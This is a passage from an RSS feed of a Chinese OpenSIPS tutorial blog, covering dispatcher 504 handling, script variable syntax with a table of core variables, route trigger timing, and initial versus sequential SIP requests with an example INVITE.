&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/__puml/cdb38f9043b0ac503750d554af0a4668.svg#lake_card_v2=eyJjb2RlIjoiQHN0YXJ0dW1sXG5sb2NhbGhvc3QgLT4gcDI6IE9QVElPTiByZXF1ZXN0XG5sb2NhbGhvc3QgLT4gcDI6IE9QVElPTiByZXF1ZXN0XG5sb2NhbGhvc3QgLT4gcDI6IE9QVElPTiByZXF1ZXN0XG5sb2NhbGhvc3QgLT4gcDI6IE9QVElPTiByZXF1ZXN0XG5AZW5kdW1sIiwidXJsIjoiaHR0cHM6Ly9jZG4ubmxhcmsuY29tL3l1cXVlL19fcHVtbC9jZGIzOGY5MDQzYjBhYzUwMzc1MGQ1NTRhZjBhNDY2OC5zdmciLCJ0eXBlIjoicHVtbCIsImlkIjoiUnBhWGkiLCJjYXJkIjoiZGlhZ3JhbSJ9&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;代码例子&#34;&gt;代码例子&lt;/h1&gt;
&lt;p&gt;ds_select_dst()函数会去选择可用的目的地，并且设置当前sip消息的转发地址。如果发现无用可转发地址，则进入504 服务不可用的逻辑。&lt;/p&gt;
&lt;p&gt;如果sip终端注册时返回504，则可以从dispatcher模块，排查看看是不是所有的目的地都处于不可用状态。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!ds_select_dst&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;504&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Service Unavailable&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>变量的使用</title>
      <link>https://wdd.js.org/opensips/ch5/var/</link>
      <pubDate>Sun, 16 Jun 2019 17:18:55 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/var/</guid>
      <description>&lt;h1 id=&#34;变量的使用方式&#34;&gt;变量的使用方式&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;&amp;lt;context&amp;gt;type&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;name&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;index&lt;span style=&#34;color:#f92672&#34;&gt;]{&lt;/span&gt;transformation&lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;变量都以$符号开头&lt;/li&gt;
&lt;li&gt;type表示变量的类型：核心变量，自定义变量，键值对变量&lt;/li&gt;
&lt;li&gt;name表示变量名：如$var(name), $avp(age)&lt;/li&gt;
&lt;li&gt;index表示需要，有些变量类似于数组，可以使用需要来指定。需要可以用正数和负数，如-1表示最后一个元素&lt;/li&gt;
&lt;li&gt;transformations表示类型转换，如获取一个字符串值的长度，大小写转换等操作&lt;/li&gt;
&lt;li&gt;context表示变量存在的作用域，opensips有请求的作用域和响应的作用域&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# by type&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ru
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# type type and name&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$hdr&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Contact&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# bye type and index&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;ct&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# by type name and index&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;avp&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gw_ip&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# by context&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;&amp;lt;request&amp;gt;ru&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;&amp;lt;reply&amp;gt;hdr&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Contact&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;引用变量&#34;&gt;引用变量&lt;/h1&gt;
&lt;p&gt;所有的引用变量都是可读的，但是只有部分变量可以修改。引用变量一般都是英文含义的首字母缩写，刚开始接触opensips的同学可能很不习惯。实际上通过首字母大概是可以猜出变量的含义的。&lt;/p&gt;
&lt;p&gt;必须记住变量的用黄色标记。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;变量名&lt;/th&gt;
          &lt;th&gt;英文含义&lt;/th&gt;
          &lt;th&gt;中文解释&lt;/th&gt;
          &lt;th&gt;是否可修改&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;$ru&lt;/td&gt;
          &lt;td&gt;request url&lt;/td&gt;
          &lt;td&gt;请求url&lt;/td&gt;
          &lt;td&gt;是&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$rU&lt;/td&gt;
          &lt;td&gt;Username in SIP Request&amp;rsquo;s URI&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;是&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$ci&lt;/td&gt;
          &lt;td&gt;call id&lt;/td&gt;
          &lt;td&gt;callId&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$hdr(from)&lt;/td&gt;
          &lt;td&gt;request headers from &lt;/td&gt;
          &lt;td&gt;请求头中的from字段&lt;/td&gt;
          &lt;td&gt;是&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$Ts&lt;/td&gt;
          &lt;td&gt;current time unix Timestamp&lt;/td&gt;
          &lt;td&gt;当前时间的unix时间戳&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$branch&lt;/td&gt;
          &lt;td&gt;Branch&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$cl&lt;/td&gt;
          &lt;td&gt;Content-Length&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$cs&lt;/td&gt;
          &lt;td&gt;CSeq number&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$cT&lt;/td&gt;
          &lt;td&gt;Content-Type&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$dd&lt;/td&gt;
          &lt;td&gt;Domain of destination URI&lt;/td&gt;
          &lt;td&gt;目标地址的域名&lt;/td&gt;
          &lt;td&gt;是&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$di&lt;/td&gt;
          &lt;td&gt;Diversion header URI&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$dp&lt;/td&gt;
          &lt;td&gt;Port of destination URI&lt;/td&gt;
          &lt;td&gt;目标地址的端口&lt;/td&gt;
          &lt;td&gt;是&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$dP&lt;/td&gt;
          &lt;td&gt;Transport protocol of destination URI&lt;/td&gt;
          &lt;td&gt;传输协议&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$du&lt;/td&gt;
          &lt;td&gt;Destination URI&lt;/td&gt;
          &lt;td&gt;目标地址&lt;/td&gt;
          &lt;td&gt;是&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$fd&lt;/td&gt;
          &lt;td&gt;From URI domain&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$fn&lt;/td&gt;
          &lt;td&gt;From display name&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$ft&lt;/td&gt;
          &lt;td&gt;From tag&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$fu&lt;/td&gt;
          &lt;td&gt;From URI&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$fU&lt;/td&gt;
          &lt;td&gt;From URI username&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$mb&lt;/td&gt;
          &lt;td&gt;SIP message buffer&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$mf&lt;/td&gt;
          &lt;td&gt;Message Flags&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$mi&lt;/td&gt;
          &lt;td&gt;SIP message ID&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$ml&lt;/td&gt;
          &lt;td&gt;SIP message length&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$od&lt;/td&gt;
          &lt;td&gt;Domain in SIP Request&amp;rsquo;s original URI&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$op&lt;/td&gt;
          &lt;td&gt;Port of SIP request&amp;rsquo;s original URI&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$oP&lt;/td&gt;
          &lt;td&gt;Transport protocol of SIP request original URI&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$ou&lt;/td&gt;
          &lt;td&gt;SIP Request&amp;rsquo;s original URI&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$oU&lt;/td&gt;
          &lt;td&gt;Username in SIP Request&amp;rsquo;s original URI&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$param(idx) &lt;/td&gt;
          &lt;td&gt;Route parameter&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$pp&lt;/td&gt;
          &lt;td&gt;Process id&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$rd&lt;/td&gt;
          &lt;td&gt; Domain in SIP Request&amp;rsquo;s URI&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$rb&lt;/td&gt;
          &lt;td&gt;Body of request/reply&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;是&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$rc&lt;/td&gt;
          &lt;td&gt;Returned code&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$re&lt;/td&gt;
          &lt;td&gt;Remote-Party-ID header URI&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$rm&lt;/td&gt;
          &lt;td&gt;SIP request&amp;rsquo;s method&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$rp&lt;/td&gt;
          &lt;td&gt;SIP request&amp;rsquo;s port&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;是&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$rP&lt;/td&gt;
          &lt;td&gt; Transport protocol of SIP request URI&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$rr&lt;/td&gt;
          &lt;td&gt; SIP reply&amp;rsquo;s reason&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$rs&lt;/td&gt;
          &lt;td&gt;SIP reply&amp;rsquo;s status&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$rt&lt;/td&gt;
          &lt;td&gt;reference to URI of refer-to header&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$Ri &lt;/td&gt;
          &lt;td&gt;Received IP address&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$Rp&lt;/td&gt;
          &lt;td&gt; Received port&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$sf&lt;/td&gt;
          &lt;td&gt; Script flags&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$si&lt;/td&gt;
          &lt;td&gt; IP source address&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$sp&lt;/td&gt;
          &lt;td&gt;Source port&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$td&lt;/td&gt;
          &lt;td&gt;To URI Domain&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$tn&lt;/td&gt;
          &lt;td&gt;To display name&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$tt&lt;/td&gt;
          &lt;td&gt;To tag&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$tu&lt;/td&gt;
          &lt;td&gt;To URI&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$tU&lt;/td&gt;
          &lt;td&gt;To URI Username&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$TF&lt;/td&gt;
          &lt;td&gt; String formatted time&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$TS&lt;/td&gt;
          &lt;td&gt; Startup unix time stamp&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;$ua&lt;/td&gt;
          &lt;td&gt;User agent header&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;更多变量可以参考：&lt;a href=&#34;https://www.opensips.org/Documentation/Script-CoreVar-2-4&#34;&gt;https://www.opensips.org/Documentation/Script-CoreVar-2-4&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>路由的触发时机</title>
      <link>https://wdd.js.org/opensips/ch5/triger-time/</link>
      <pubDate>Sun, 16 Jun 2019 17:16:41 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/triger-time/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch5/triger-time/2022-12-01-21-38-23.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;掌握路由触发时机的关键是以下几点&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;消息是请求还是响应&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;消息是进入opensips的(incoming)，还是离开opensips的(outgoing)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;从opensips发出去的ack请求，不会触发任何路由&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;/th&gt;
          &lt;th&gt;**进入opensips(**incoming)&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;离开opensip&lt;/strong&gt;s(outgoing)&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;请求&lt;/td&gt;
          &lt;td&gt;触发请求路由：例如invite, register, ack&lt;/td&gt;
          &lt;td&gt;触发分支路由。如invite的转发&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;响应&lt;/td&gt;
          &lt;td&gt;触发响应路由。如果是大于等于300的响应，还会触发失败路由。&lt;/td&gt;
          &lt;td&gt;不会触发任何路由&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;</description>
    </item>
    <item>
      <title>【重点】初始化请求和序列化请求</title>
      <link>https://wdd.js.org/opensips/ch5/init-seque/</link>
      <pubDate>Sun, 16 Jun 2019 12:50:22 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/init-seque/</guid>
      <description>&lt;p&gt;在说这两种路由前，先说一个故事。蚂蚁找食物。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;蚁群里有一种蚂蚁负责搜寻食物叫做侦察兵，侦察兵得到消息，不远处可能有食物。于是侦察兵开始搜索食物的位置，并沿途留下自己的气味。翻过几座山之后，侦察兵发现了食物。然后又沿着气味回到了部落。然后通知搬运兵，沿着自己留下的气味，就可以找到食物。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;在上面的故事中，侦查兵可以看成是初始化请求，搬运并可以看做是序列化请求。在学习opensips的路由过程中，能够区分初始化请求和序列化请求，是非常重要的。&lt;/p&gt;
&lt;p&gt;一般路由处理，查数据库，查dns等都在初始化请求中做处理，序列化请求只需要简单的更具sip route字段去路由就可以了。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;类型&lt;/th&gt;
          &lt;th&gt;功能&lt;/th&gt;
          &lt;th&gt;message&lt;/th&gt;
          &lt;th&gt;如何区分&lt;/th&gt;
          &lt;th&gt;特点&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;初始化请求&lt;/td&gt;
          &lt;td&gt;创建session或者dialog&lt;/td&gt;
          &lt;td&gt;invite&lt;/td&gt;
          &lt;td&gt;has_totag()是false&lt;/td&gt;
          &lt;td&gt;&lt;!-- raw HTML omitted --&gt;1. &lt;strong&gt;发现被叫&lt;/strong&gt;：初始化请求经过不同的服务器，DNS服务器，前缀路由等各种复杂的路由方法，找到被叫&lt;!-- raw HTML omitted --&gt;2. **记录路径: **记录到达被叫的路径，给后续的序列请求提供导航&lt;!-- raw HTML omitted --&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;序列化请求&lt;/td&gt;
          &lt;td&gt;修改或者终止session&lt;/td&gt;
          &lt;td&gt;ack, bye, re-ivite, notify&lt;/td&gt;
          &lt;td&gt;has_totag()是true&lt;/td&gt;
          &lt;td&gt;&lt;!-- raw HTML omitted --&gt;1. 只需要根据初始化请求提供的导航路径，来到达路径，不需要复杂的路由逻辑。&lt;!-- raw HTML omitted --&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;区分初始化请求和序列化请求，是用header字段中的to字段是否含有tag标签。&lt;/p&gt;
&lt;p&gt;tag参数被用于to和from字段。使用callid，fromtag和totag三个字段可以来唯一识别一个dialog。每个tag来自一个ua。&lt;/p&gt;
&lt;p&gt;当一个ua发出一个不在对话中的请求时，fromtag提供一半的对话标识，当对话完成时，另一方参与者提供totag标识。&lt;/p&gt;
&lt;p&gt;举例来说，对于一个invite请求，例如Alice-&amp;gt;Proxy&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;invite请求to字段无tag参数&lt;/li&gt;
&lt;li&gt;当alice回ack请求时，已经含有了to tag。这就是一个序列化请求了。因为通过之前的200ok, alice已经知道到达bob的路径。&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INVITE sip:bob@biloxi.example.com SIP/2.0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Via: SIP/2.0/TCP client.atlanta.example.com:5060;branch&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;z9hG4bK74b43
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Max-Forwards: &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Route: &amp;lt;sip:ss1.atlanta.example.com;lr&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;From: Alice &amp;lt;sip:alice@atlanta.example.com&amp;gt;;tag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;9fxced76sl  &lt;span style=&#34;color:#75715e&#34;&gt;# 有from tag&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;To: Bob &amp;lt;sip:bob@biloxi.example.com&amp;gt;                        &lt;span style=&#34;color:#75715e&#34;&gt;# 无to tag&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Call-ID: 3848276298220188511@atlanta.example.com
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CSeq: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; INVITE
